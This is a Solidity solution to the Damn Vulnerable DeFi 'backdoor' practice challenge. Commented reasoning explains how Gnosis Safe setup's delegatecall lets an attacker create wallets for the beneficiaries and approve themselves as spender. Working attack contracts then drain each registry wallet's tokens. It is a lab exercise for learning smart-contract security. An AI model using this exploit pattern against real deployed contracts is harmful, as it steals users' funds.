// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/interfaces/ISignatureValidator.sol";


// @audit in backdoor.challenge.js after() has:
//
//  // User must have registered a wallet
//  expect(wallet).to.not.eq(ethers.constants.AddressZero, 'User did not register a wallet');
// 
// This is a big hint that the Gnosis Safe has not been correctly
// configured as wallets have not been registered for the beneficiaries,
// and that the solution will involve registering wallets for them. After() also has:
//
//  // User is no longer registered as a beneficiary
//  expect(await walletRegistry.beneficiaries(users[i])).to.be.false;
//
// But users are removed as beneficiaries in WalletRegistry.proxyCreated(), which
// suggests this function hasn't been called. Putting a console.log() in 
// WalletRegistry.proxyCreated() & running the test shows this function never gets called.
//
// The comment above WalletRegistry.proxyCreated() indicates it should be called when users 
// create a Gnosis Safe wallet via GnosisSafeProxyFactory.createProxyWithCallback(), and
// WalletRegistry.proxyCreated() takes is input:
// - GnosisSafeProxy proxy (proxy representing created GnosisSafe wallet)
// - bytes calldata initializer a parameter we passed to GnosisSafeProxyFactory.createProxyWithCallback()
//
// WalletRegistry.proxyCreated() also checks:         
//  // Ensure initial calldata was a call to `GnosisSafe::setup`
//  if (bytes4(initializer[:4]) != GnosisSafe.setup.selector) {
//      revert InvalidInitialization();}
//
// This suggests that initializer parameter we have to pass to GnosisSafeProxyFactory.createProxyWithCallback()
// will have function selector GnosisSafe.setup.selector + parameters to call GnosisSafe.setup()
// https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/GnosisSafe.sol
//
// Reading https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/proxies/GnosisSafeProxyFactory.sol
// we see that createProxyWithCallback() calls createProxyWithNonce() which:
// -  calls deployProxyWithNonce() which creates & returns proxy,
// -  if initializer.length > 0, uses our initializer to call() on newly created Proxy; this will
//    call GnosisSafe.setup() on newly created wallet
//
// Read more about the Factory & Clone Factory pattern:
// https://betterprogramming.pub/learn-solidity-the-factory-pattern-75d11c3e7d29
//
// GnosisSafe.setup() has two interesting parameters: address to, bytes calldata data with comments:
//  /// @param to Contract address for optional delegate call.
//  /// @param data Data payload for optional delegate call.
//
// This suggests that we can have the GnosisSafeProxy, after it has been created & initialized, 
// delegatecall an arbitrary function with arbitrary parameters that we control. We could use this
// to make it delegatecall a function in our attack contract which can execute arbitrary code
// using the GnosisSafeProxy context.
//
// This function can simply call approve() on DVT contract to approve our attack contract as a spender,
// then when control returns to our attack contract after GnosisSafeProxyFactory finishes, call transferFrom() 
// on the DVT contract to steal the tokens :-) Tracking execution flow through the code to verify:
//
// GnosisSafe.setup(..,to,data,..) 
// -> ModuleManager.setupModules(to, data) 
// --> Executor.execute(to,..,data,Enum.Operation.DelegateCall,..) 
// ---> calls delegatecall() using to & data. Bingo!
//
// Finally in WalletRegistry.proxyCreated() at the end it sends the wallet tokens
// to the newly created GnosisSafeProxy, so we'll need to drain that contract
// when calling DVT.transferFrom()
//
// Attack:
//
// 1) For each beneficiary, call GnosisSafeProxyFactory.createProxyWithCallback()
// with initializer payload to call GnosisSafe.setup() + delegatecall into a function 
// we control that will approve our attack contract as spender
//
// 2) Call DVT.transferFrom() to drain tokens via newly created GnosisSafeProxy wallet
//

// the challenge requires we complete it in 1 transaction, so the main attack must happen
// in attack contract constructor. Hence that constructor needs to create this additional contract
// so that this external function can exist allowing GnosisSafeProxy to delegatecall() to it

/**
 * @title DelegateCallbackAttack
 * @author @devdacian https://github.com/devdacian/damn-vulnerable-defi-solutions/blob/master/contracts/backdoor/WalletRegistry.sol
 */
contract DelegateCallbackAttack {
    // this will be called by newly created GnosisSafeProxy using delegatecall()
    // this allows attacker to execute arbitrary code using GnosisSafeProxy context;
    // use this to approve token transfer for main attack contract
    function delegateCallback(address token, address spender, uint256 drainAmount) external {
        IERC20(token).approve(spender, drainAmount);
    }
}

/**
 * @title WalletRegistryAttack
 * @author @devdacian https://github.com/devdacian/damn-vulnerable-defi-solutions/blob/master/contracts/backdoor/WalletRegistry.sol
 */
contract WalletRegistryAttack {
    uint256 immutable DRAIN_AMOUNT = 10 ether;

    // attack execute in constructor to pass 1 transaction requirement
    constructor(address[] memory _initialBeneficiaries,
                address          _walletRegistry ) {

        DelegateCallbackAttack delegateCallback = new DelegateCallbackAttack();
        WalletRegistry walletRegistry       = WalletRegistry(_walletRegistry);
        GnosisSafeProxyFactory proxyFactory = GnosisSafeProxyFactory(walletRegistry.walletFactory());
        IERC20 token                        = walletRegistry.token();

        for (uint8 i = 0; i < _initialBeneficiaries.length;) {       
            // corresponds to GnosisSafe.setup(address[] calldata _owners) - the owners of this
            // safe, in our case each safe will have one owner, the beneficiary.
            address[] memory owners = new address[](1);
            owners[0] = _initialBeneficiaries[i];

            // corresponds to GnosisSafeProxyFactory.createProxyWithCallback(..,bytes memory initializer,..)
            // has function selector = GnosisSafe.setup.selector
            // and parameters corresponding to GnosisSafe.setup()
            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector, // function selector = GnosisSafe.setup.selector
                owners,                    // 1 safe owner; the beneficiary
                1,                         // 1 confirmation required for a safe transaction
                address(delegateCallback), // delegatecall() from new GnosisSafeProxy into attack contract
                                           // function selector of delegatecall attack function + params
                abi.encodeWithSelector(DelegateCallbackAttack.delegateCallback.selector, 
                                       address(token), address(this), DRAIN_AMOUNT),
                address(0),                // no fallbackHandler
                address(0),                // no paymentToken
                0,                         // no payment
                address(0)                 // no paymentReceiver
            );

            // Next using our payload, create the wallet (proxy) for each beneficiary. 
            // This should have been done as part of the initial GnosisSafe setup, 
            // this not being done is what allows us to do it and exploit the contract
            GnosisSafeProxy safeProxy = proxyFactory.createProxyWithCallback(
                walletRegistry.masterCopy(), 
                initializer, 
                i, // nonce used to generate salt to calculate address of new proxy contract
                // callback to WalletRegistry.proxyCreated() after new proxy deployed & initialized
                IProxyCreationCallback(_walletRegistry) 
            );

            // At this point the GnosisSafeFactory has deployed & initialized the new GnosisSafeProxy,
            // and has used delegatecall() to execute our attack callback function which
            // called DVT.approve() with GnosisSafeProxy context, making our attack contract 
            // an the approved spender. All that is left to do is directly call DVT.transferFrom() 
            // with new proxy address to drain wallet
            require(token.allowance(address(safeProxy), address(this)) == DRAIN_AMOUNT);
            token.transferFrom(address(safeProxy), msg.sender, DRAIN_AMOUNT);

            unchecked{++i;}
        }
    }
}
